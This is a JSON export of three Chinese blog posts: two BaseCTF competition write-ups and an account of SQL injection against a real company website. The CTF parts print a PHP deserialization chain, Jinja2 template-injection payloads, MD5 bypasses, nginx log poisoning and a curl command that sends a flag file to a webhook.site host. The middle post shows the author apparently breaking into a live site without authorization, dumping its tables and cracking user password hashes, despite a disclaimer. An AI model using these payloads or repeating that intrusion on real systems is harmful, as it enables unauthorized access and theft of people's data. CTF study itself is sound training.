[{"content":"[Week2] Really EZ POP 这道题记录一下的原因是因为这个php版本太低导致我们不能通过更改成员变量的属性来构造pop利用链，开始我就犯了这个错。不能改变属性但可以使用在类内部写入构造方法来构造链子\nwp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 error_reporting(0); class Sink { private $cmd = \u0026#39;echo 123;\u0026#39;; public function __construct() { $this-\u0026gt;cmd = \u0026#39;system(\\\u0026#39;cat /flag\\\u0026#39;);\u0026#39;; } public function __toString() { eval($this-\u0026gt;cmd); } } class Shark { private $word = \u0026#39;Hello, World!\u0026#39;; public function __construct() { $this-\u0026gt;word = new Sink(); } public function __invoke() { echo \u0026#39;Shark says:\u0026#39; . $this-\u0026gt;word; } } class Sea { public $animal; public function __construct() { $this-\u0026gt;animal = new Shark(); } public function __get($name) { $sea_ani = $this-\u0026gt;animal; echo \u0026#39;In a deep deep sea, there is a \u0026#39; . $sea_ani(); } } class Nature { public $sea; public function __construct() { $this-\u0026gt;sea = new Sea(); } public function __destruct() { echo $this-\u0026gt;sea-\u0026gt;see; } } $ser = new Nature(); echo urlencode(serialize($ser)); [Week2] 所以你说你懂 MD5? 这道题当时是真不会哈希长度扩展攻击，题目源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 \u0026lt;?php session_start(); highlight_file(__FILE__); // 所以你说你懂 MD5 了? $apple = $_POST[\u0026#39;apple\u0026#39;]; $banana = $_POST[\u0026#39;banana\u0026#39;]; if (!($apple !== $banana \u0026amp;\u0026amp; md5($apple) === md5($banana))) { die(\u0026#39;加强难度就不会了?\u0026#39;); } // 什么? 你绕过去了? // 加大剂量! // 我要让他成为 string $apple = (string)$_POST[\u0026#39;appple\u0026#39;]; $banana = (string)$_POST[\u0026#39;bananana\u0026#39;]; if (!((string)$apple !== (string)$banana \u0026amp;\u0026amp; md5((string)$apple) == md5((string)$banana))) { die(\u0026#39;难吗?不难!\u0026#39;); } // 你还是绕过去了? // 哦哦哦, 我少了一个等于号 $apple = (string)$_POST[\u0026#39;apppple\u0026#39;]; $banana = (string)$_POST[\u0026#39;banananana\u0026#39;]; if (!((string)$apple !== (string)$banana \u0026amp;\u0026amp; md5((string)$apple) === md5((string)$banana))) { die(\u0026#39;嘻嘻, 不会了? 没看直播回放?\u0026#39;); } // 你以为这就结束了 if (!isset($_SESSION[\u0026#39;random\u0026#39;])) { $_SESSION[\u0026#39;random\u0026#39;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)); } // 你想看到 random 的值吗? // 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧 $random = $_SESSION[\u0026#39;random\u0026#39;]; echo md5($random); echo \u0026#39;\u0026lt;br /\u0026gt;\u0026#39;; $name = $_POST[\u0026#39;name\u0026#39;] ?? \u0026#39;user\u0026#39;; // check if name ends with \u0026#39;admin\u0026#39; if (substr($name, -5) !== \u0026#39;admin\u0026#39;) { die(\u0026#39;不是管理员也来凑热闹?\u0026#39;); } $md5 = $_POST[\u0026#39;md5\u0026#39;]; if (md5($random . $name) !== $md5) { die(\u0026#39;伪造? NO NO NO!\u0026#39;); } // 认输了, 看样子你真的很懂 MD5 // 那 flag 就给你吧 echo \u0026#34;看样子你真的很懂 MD5\u0026#34;; echo file_get_contents(\u0026#39;/flag\u0026#39;); 第一个比较可以利用传入数组，因为md5函数不能处理数组返回null，两个null自然相等\n第二个比较是弱比较，我们可以利用科学计数法0e开头的字符串传参进行绕过\n第三个比较用了string强制类型转换，我们可以使用工具fastcoll生成两个md5值相同的字符串，原理就是原本payload字符串中含有多种空白符号，MD5加密后hash值相等(空白符号不影响md5值)。但是我们上传参数时会自动进行一次url解码，这样过后因为空白字符两个url就不相等了，从而成功绕过，也可以上网找一些相等的，我这里给出一组\n1 2 3 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 \u0026amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 后面的知识就涉及到哈希长度拓展攻击了\n参考文章: https://luoingly.top/post/md5-length-extension-attack/\nhttps://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html\n全局变量random长度为96\n而name由我们传入可控，后面还会和md5($random)拼接，我们可以构造payload进行填充让新建一个分组包含后面需要验证的admin\n这里使用工具生成了，我是菜比\n先输入random的文本长度，然后是random的hash，最后是我们希望拓展的字符串\n生成后选择url编码一次的payload，浏览器会自动对我们传递的参数进行一次解码。\n然后再传入新的hash，虽然字符串上看起来不一样，但在md5分组运算的时候是一样的，所以两个md5判断为相等，由此拿到flag\n[Week2] 你听不到我的声音 这道题是一个无回显的RCE利用，方法有很多种\n重定向到文件 导入到txt文件我们就可以进行访问了\n1 cat/cp/mv /flag \u0026gt; 1.txt 利用curl命令和[webhook](Webhook.site - Test, transform and automate Web requests and emails)进行信息外带出flag\npayload\n1 curl https://webhook.site/44f66666-8c8a-47bd-978a-84f7a596c7ff/`cat /flag | base64` 直接写马 写马, 用 wget, curl 下载木马然后webshell管理工具连接\n[Week2] 数学大师 这道题我就只贴脚本了\n我的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import re import requests s = requests.Session() # 使用Session对象 url = \u0026#39;http://challenge.basectf.fun:37945/\u0026#39; res = s.get(url=url) #get请求如果放到循环体相等于打开五十个页面了，我们只需在循环体里更新用于匹配计算式的文本即可 string = res.text for i in range(50): # 提取算术表达式 pattern = r\u0026#39;second ([\\d×÷+-/]+)\u0026#39; matches = re.findall(pattern, string) expression = matches[0].replace(\u0026#39;×\u0026#39;, \u0026#39;*\u0026#39;).replace(\u0026#39;÷\u0026#39;, \u0026#39;/\u0026#39;) # 计算表达式 result = int(eval(expression)) r = s.post(url=url, data={\u0026#39;answer\u0026#39;: result}) print(r.text) # 更新页面内容 string = r.text 官方wp的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import requests import re req = requests.session() url = \u0026#34;http://challenge.basectf.fun:24989/\u0026#34; answer = 0 while True: response = req.post(url , data={\u0026#34;answer\u0026#34;: answer}) print(response.text) if \u0026#34;BaseCTF\u0026#34; in response.text: print(response.text) break regex = r\u0026#34; (\\d*?)(.)(\\d*)\\?\u0026#34; match = re.search(regex, response.text) if match.group(2) == \u0026#34;+\u0026#34;: answer = int(match.group(1)) + int(match.group(3)) elif match.group(2) == \u0026#34;-\u0026#34;: answer = int(match.group(1)) - int(match.group(3)) elif match.group(2) == \u0026#34;×\u0026#34;: answer = int(match.group(1)) * int(match.group(3)) elif match.group(2) == \u0026#34;÷\u0026#34;: answer = int(match.group(1)) // int(match.group(3)) [Week3] 复读机 这道题是ssti，模版引擎应该是jinja2,这里它必须以BaseCTF开头所以不能直接使用fengjing了。\n还过滤了双花括号，点和双引号和下划线\n寻找可用子类\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]())%} 寻找一个含os模块能RCE的类，我这里懒得写脚本直接用Notepad++将逗号替换为换行符找到该模块的位置为137\n继续构造继承链查看当前作用域中的全局变量\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;])%} 发现Popen方法，可以用它执行命令再用read()读取即可\n构造payload\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;id\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} 执行成功\n但是发现根号被ban了，这里我开始只想到${PATH:0:1},后面一位大佬研究处${HOME%%root}\n一般HOME目录都在/root下\n所以可构造payload查看flag\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;cat ${HOME%%root}flag\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} 后面查看该系统环境变量存在一个为根号的环境变量\n构造payload\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;cd $OLDPWD;cat flag\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} [Week3] 滤个不停 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $incompetent = $_POST[\u0026#39;incompetent\u0026#39;]; $Datch = $_POST[\u0026#39;Datch\u0026#39;]; if ($incompetent !== \u0026#39;HelloWorld\u0026#39;) { die(\u0026#39;写出程序员的第一行问候吧！\u0026#39;); } //这是个什么东东？？？ $required_chars = [\u0026#39;s\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;]; $is_valid = true; foreach ($required_chars as $char) { if (strpos($Datch, $char) === false) {//意思是必须在$Datch中找到上面所有字母 $is_valid = false; break; } } if ($is_valid) { $invalid_patterns = [\u0026#39;php://\u0026#39;, \u0026#39;http://\u0026#39;, \u0026#39;https://\u0026#39;, \u0026#39;ftp://\u0026#39;, \u0026#39;file://\u0026#39; , \u0026#39;data://\u0026#39;, \u0026#39;gopher://\u0026#39;]; foreach ($invalid_patterns as $pattern) { if (stripos($Datch, $pattern) !== false) { die(\u0026#39;此路不通换条路试试?\u0026#39;); } } include($Datch); } else { die(\u0026#39;文件名不合规 请重试\u0026#39;); } ?\u0026gt; 我们要实现文件包含，但是一堆伪协议都被过滤掉了，没法绕过！\n后面查找资料发现这里可以用Nginx日志写入webshell\n日志路径为\nnginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log\n利用access.log中User-Agent写入一句话木马，然后post里面传递参数执行命令\n[Week4] No JWT 源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from flask import Flask, request, jsonify import jwt import datetime import os import random import string app = Flask(__name__) # 随机生成 secret_key app.secret_key = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=16)) # 登录接口 @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def login(): data = request.json username = data.get(\u0026#39;username\u0026#39;) password = data.get(\u0026#39;password\u0026#39;) # 其他用户都给予 user 权限 token = jwt.encode({ \u0026#39;sub\u0026#39;: username, \u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, # 普通用户角色 \u0026#39;exp\u0026#39;: datetime.datetime.utcnow() + datetime.timedelta(hours=1) }, app.secret_key, algorithm=\u0026#39;HS256\u0026#39;) return jsonify({\u0026#39;token\u0026#39;: token}), 200 # flag 接口 @app.route(\u0026#39;/flag\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def flag(): token = request.headers.get(\u0026#39;Authorization\u0026#39;) if token: try: decoded = jwt.decode(token.split(\u0026#34; \u0026#34;)[1], options={\u0026#34;verify_signature\u0026#34;: False, \u0026#34;verify_exp\u0026#34;: False}) # 检查用户角色是否为 admin if decoded.get(\u0026#39;role\u0026#39;) == \u0026#39;admin\u0026#39;: with open(\u0026#39;/flag\u0026#39;, \u0026#39;r\u0026#39;) as f: flag_content = f.read() return jsonify({\u0026#39;flag\u0026#39;: flag_content}), 200 else: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Access denied: admin only\u0026#39;}), 403 except FileNotFoundError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Flag file not found\u0026#39;}), 404 except jwt.ExpiredSignatureError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Token has expired\u0026#39;}), 401 except jwt.InvalidTokenError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Invalid token\u0026#39;}), 401 return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Token is missing\u0026#39;}), 401 if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 发现/login和/flag两个路由，先去login路由查看一下\npost方式访问，修改为json请求并传递json数据发现一串token\n[jwt解密网站](JSON Web Tokens - jwt.io)解析一下token，flag路由检验身份必须为admin，我们修改即可\n因为源码从headers中Authorization接受数据，我们手动添加一个\n又因为如下原因\n在HTTP请求中，Authorization头部用于提供访问受保护资源所需的凭证。Bearer是认证的一种方式，它表示该请求中包含一个访问令牌（access token），这个令牌用于授权用户访问受保护的资源。\n具体来说，Authorization头部的格式为：\n1 Authorization: Bearer \u0026lt;access_token\u0026gt; 其中，Bearer关键字告诉服务器，接下来的 \u0026lt;access_token\u0026gt; 是一个令牌，用于授权请求。Bearer 认证方式是OAuth 2.0标准的一部分，用于实现无状态的访问控制，令牌通常由身份验证服务器颁发，并在请求中传递，用于验证用户身份和权限。\n总的来说，Bearer前缀的作用是明确标识令牌的类型，告诉服务器如何处理和验证这个令牌。\n所以我们构造出如下数据包即可获得flag\n","date":"2024-09-12T17:26:54+08:00","permalink":"http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/","title":"BaseCTF招新赛 Web Wp"},{"content":"发现方式 利用goole语法inurl=\u0026quot;id=\u0026quot;发现某公司php站点，在id后输入1' and 'a'='a'--显示被waf拦截\n这个waf我去搜了一下是西数的一个waf，挺拉的\n经过尝试发现是空格被过滤了，于是将空格用+替换。输入1'+and+'a'='a'--后页面报错，说明存在sql注入漏洞\n基本信息 1 2 3 4 5 ?id=1+union+select+database()-- ?id=1+union+select+version()-- ?id=1+union+select+user()-- 成功查询到当前库名：sanying mysql版本：5.7.43 user：sanying@127.0.0.1 这个版本是好多年前的了，高版本的用法不能在这用\n查库 在构造的时候又发现这个waf规则里面group_concat不能和括号连用，所以我们只能用limit一条一条查\n构造payload\n?id=-1+union+select+schema_name+from+information_schema.schemata+limit+0,1--\n发现只有两个库，其中一个还是系统库(°ー°〃)\n看来只用脱sanying库就行了，系统库就不管了\n查表 构造payload\n?id=-1+union+select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1--\n后面可以用用burp的攻击模块或者自己写个脚本提取，我选的后者。因为前者还要自己去把表名抄下来太麻烦，我根据页面回显利用python re库和正则将回显内容提取出来即可，最后发现有共17张表\n查列名 查列名的时候又发现不能指定数据库或者具体的表名来查，反正我们只脱一个库数据库名就可以一直用database(),表名就用子查询+limit n,1来指定，后续把n当作循环变量即可\n构造payload\n?id=-1+union+select+column_name+from+information_schema.columns+where+table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+n,1)+and+table_schema=database()+limit+0,1--\n然后写入脚本自动化查询每张表的列名\n查数据 到这里了开始我是想尽办法构造出列名，结果最后发现可以直接指定列名来查，不知道为什么，这个waf给我人整麻了 ╮(╯▽╰)╭\n构造payload\n-1+union+select+{data[i]}+from+Sanying.{km}\n这里是从脚本里面复制出来的，我是先把列名处理成列表\n这里因为不太会协调这些数据的位置处理输出到xlsx，有些列还是空的，所以我只能半自动化手动填数据到excel，有大佬的话浇浇我！\n成果 最后就是这样，拿到了两个账号和一些信息，这库也是真的老了，十几年前的了，密码还是用的md5，但是最近又有人登录。后面利用hashcat和在线网站成功解出两个md5哈希，也算是稍有收获！\n免责声明： 目的：本文旨在分享有关网络安全渗透知识的信息，以促进对网络安全的理解和提高个人和组织的安全意识。这些知识和技术应仅用于合法的、授权的安全测试和红队操作，并遵守适用的法律和道德规范。\n法律合规：在参考本文所提供的渗透测试和攻击技术时，请确保遵守您所在国家或地区的法律法规。未经合法授权和明确许可，禁止使用这些知识和技术从事非法活动，如未经授权的入侵、数据盗取、破坏性攻击等。\n责任限制：使用本文所提供的信息和技术的过程中，如因操作不当或其他原因导致任何损失或损害，作者概不负责。使用者应自行承担所有风险和后果。\n免责声明：本文的分享仅为技术交流和学习之用，并不鼓励任何非法活动。作者不对任何个人或组织的非法行为承担任何责任。\n出事与作者无关：使用者在运用本文提供的知识和技术时，应自行判断和承担责任。如因使用者违反法律法规或滥用本文提供的知识和技术而导致任何问题、损失或法律责任，与作者无关。使用者应对其行为负完全责任。\n合法授权：在进行安全测试和渗透测试时，使用者应首先获得相关系统和网络的合法授权，确保测试的对象是属于您合法所有或得到明确授权的。\n持续学习：网络安全是一个不断发展和演变的领域，本文提供的知识和技术可能随时间而过时或失效。使用者应不断学习和更新知识，关注最新的安全趋势、漏洞和防护措施。\n通过阅读和使用本文提供的信息和技术，视为您理解并同意以上免责声明，并同意自行承担使用这些知识和技术所产生的风险和后果。作者对任何不当使用所导致的问题、损失或法律责任概不负责。\n","date":"2024-09-11T11:34:30+08:00","permalink":"http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"记一次真实站点sql注入漏洞"},{"content":" [!NOTE]\n这里我就只写一些有价值点的和我当时不会的题目的wp了\n[Week1] 捂住X只耳 下载音频后未发现频谱和音频波异常，听了下在音乐后半段有摩斯电码声音，所以我们需要将摩斯电码从音乐中分离出来以便识别\n先点击三个点分离立体声到单音道 点击左上角文件-\u0026gt;导出音频-\u0026gt;多个文件-\u0026gt;导出 成功导出两个wav\n打开Adobe Audition，左上角依次点击文件——新建——多轨会话——确定\n将刚才生成的两个wav拖入进多轨会话，然后双击未命名混音项目，再将两个wav拖入右边轨道\n双击一个轨道进入后上面工具栏点击——效果——反相 双击左侧未命名混音项目后点击左上角，选择导出，多轨混音，整个会话，选择导出位置后直接导出 将生成的mp3拖入audacity，点击三个点，频谱图。然后按住ctrl滑动滚轮放大可以看到明显的摩斯码，抄下来解密即可 [Week2] Base?! 这是一段xx-encode码，开始真没想到，随波逐流一把嗦即可\n[Week3] Base revenge 将以上文本base64隐写解密得到JnUaAFMFImgANSEuAWYuBE9SyaYpC2ldBrU9\n将hint一键解码发现是atbash加密\n因为编码器解出来大小写有问题直接用[cyberchef](Atbash Cipher - CyberChef)\n再base64解码即可\n[Week3] broken.mp4 这道题挺简单的，两个视频用untrunc工具修复即可\n[Week3] 外星信号 音频播放就有莫斯码，先丢[在线网站](Morse Code Adaptive Audio Decoder | Morse Code World)听一下,前半部分flag在这里面，要转换小写\n音频使用foremost提取出压缩包里面有另一个音频，一听就知道是sstv，sstv我只推荐使用[这个脚本](colaclanth/sstv: SSTV Decoder (github.com))，软件又拉又麻烦,下面是用法\n1 sstv -d flag.mp3 -o result.png 提取出摩斯码图片如下\n和前面半段flag组合转换小写即可\n[Week3] 这是一个压缩包 这道题利用archpr工具的掩码破解，花了我n小时，感觉脚本会更快\n[Week4] Webshell 这道题先用wireshark提取出rar压缩包，解压发现是一套WordPress程序，这种博客没啥上传点吧，ai回答\nWordPress作为一款广泛使用的内容管理系统（CMS），其安全性一直备受关注。关于WordPress中容易被上传webshell的文件路径，可以从以下几个方面进行归纳： 主题文件夹： 路径示例：/wp-content/themes/[主题名称]/ 说明：WordPress允许用户通过后台上传和安装主题。黑客可能会将恶意代码（如webshell）嵌入到自定义主题中，并通过上传主题的方式将其部署到目标网站上。一旦主题被安装，webshell就可以被用来执行恶意命令或操纵网站。 插件文件夹：\n虽然问题中主要询问的是关于webshell上传的文件路径，但值得注意的是，插件文件夹也是潜在的安全风险点。 路径示例：/wp-content/plugins/[插件名称]/ 说明：与主题类似，插件也是WordPress扩展功能的重要方式。黑客可能会利用漏洞或恶意插件来上传webshell，从而控制网站。 上传文件夹：\n路径示例：/wp-content/uploads/ 说明：这是WordPress默认的媒体文件上传目录。虽然直接在这个文件夹中上传webshell可能受到WordPress的限制，但黑客可能会通过绕过安全检查或将webshell与合法文件捆绑上传的方式来达到目的。 自定义上传目录：\n路径示例：根据用户设置而定（如/wp-content/uploads/custom-directory/） 说明：WordPress允许用户通过修改配置或安装特定插件来更改默认的上传目录。如果这些自定义目录的安全设置不当，就可能成为黑客上传webshell的潜在目标。\n然后再插件目录下确实发现了\n转字符串后发现读取ui.js文件的内容\n目录下搜索ui.js，解码后发现很像@eval($_POST[\u0026rsquo;\u0026rsquo;])这种，但是传webshell的都使用了自定义函数和各种函数加编码，还是相当有水平的\n连接密码提交不对？再回去一看原来还有层rot13，解密提交即可\n[Week4] 二维码2-阿喀琉斯之踵 这道题用CQR纠错是不行的，里面二维码被添加了东西格式不对，用这个[项目](QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx))可以尝试爆破所有格式\n从图片导入qrcode-2.png 点击右上角tools 先选择爆破格式模式，然后再点击最上面提取信息 over\n[Week4] 小cheny的社交 这道题，嗯\u0026hellip;会了后有点没啥讲的了，我大体说下过程\nstegsolve看到一串字符，base64解码后再转16进制ascii得到一个QQ\n搜索QQ在她空间发现尊嘟假嘟编码，用[](尊嘟假嘟O.o (zdjd.asia))解码得到前半flag，然后还有个视频到b站搜评论下@了一个人点进去看到另外一串密文\n看着很像链接，用随波逐流梭哈搜索https发现链接\n进入链接博客又发现尊嘟假嘟编码，这里解码得到后半flag[](尊嘟假嘟O.o (zdjd.asia))\n","date":"2024-09-10T15:25:42+08:00","permalink":"http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/","title":"BaseCTF招新赛-Misc-wp"}]